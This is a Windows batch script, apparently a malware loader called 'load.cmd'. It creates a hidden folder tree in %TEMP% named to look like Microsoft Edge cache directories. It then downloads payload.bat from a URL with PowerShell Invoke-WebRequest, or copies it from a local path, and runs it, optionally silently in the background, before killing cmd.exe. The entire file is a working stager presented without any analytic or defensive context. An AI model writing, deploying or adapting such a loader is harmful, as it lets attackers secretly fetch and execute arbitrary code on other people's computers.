@echo off

cd %TEMP%
md .edge
cd .edge
md Microsoft Edge
cd Microsoft Edge
md cache
md userdata
md Default
cd cache
md Downloads
md Bookmarks
md Application
cd Application
if %1==url goto online
if %1==path goto local
goto fail
:online
powershell -Command "Invoke-WebRequest http://www.example.com/payload.bat -OutFile payload.bat"
goto checksilent

:local
xcopy C:\payload.bat %TEMP%\.edge\Microsoft Edge\cache\Application\payload.bat
  
:checksilent
if %2==--silent goto :silentrun
start payload.bat
goto exit

:silentrun
start /B cmd /C "payload.bat"
goto exit

:fail
echo Correct Usage: load.cmd [url/path] (--silent)


:exit
taskkill /f /im cmd.exe
